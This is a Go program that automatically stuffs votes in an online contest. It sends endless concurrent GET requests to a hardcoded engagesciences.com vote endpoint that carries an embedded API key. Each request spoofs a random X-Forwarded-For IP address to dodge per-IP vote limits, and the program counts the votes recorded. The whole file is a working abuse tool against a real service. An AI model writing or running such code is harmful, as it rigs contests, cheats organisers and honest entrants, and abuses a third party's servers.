package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

var (
	url           = flag.String("url", "https://submit.engagesciences.com/metric/record/1001.json?cID=67605&apikey=52b3049d-ac0c-4222-a2e7-ff04d63098e0", "vote url")
	maxGoRoutines = flag.Int("max", 50, "max concurrent go routines")
)

var client = &http.Client{
	Timeout: time.Second * 5,
}

var voteCount int

type payload struct {
	Recorded bool `json:"recorded"`
}

func init() {
	rand.Seed(time.Now().Unix())
	flag.Parse()
}

func randIP() string {
	ip := make([]string, 4)
	for i := range ip {
		ip[i] = strconv.Itoa(rand.Intn(250))
	}
	return strings.Join(ip, ".")
}

func main() {
	var active int
	for {
		active++
		go func() {
			defer func() {
				active--
			}()
			req, err := http.NewRequest(http.MethodGet, *url, nil)
			if err != nil {
				panic(err)
			}
			ip := randIP()
			req.Header.Add("X-Forwarded-For", ip) // LUL
			res, err := client.Do(req)
			if err != nil {
				log.Println(err)
				return
			}
			bs, err := ioutil.ReadAll(res.Body)
			if err != nil {
				log.Println(err)
				return
			}
			var p payload
			err = json.Unmarshal(bs, &p)
			if err != nil {
				log.Println(err, string(bs))
				return
			}
			fmt.Println(res.StatusCode, p.Recorded, ip, voteCount)
			if !p.Recorded {
				fmt.Println(string(bs))
				return
			}
			voteCount++
		}()
		for active > *maxGoRoutines {
			time.Sleep(time.Second)
		}
	}
}
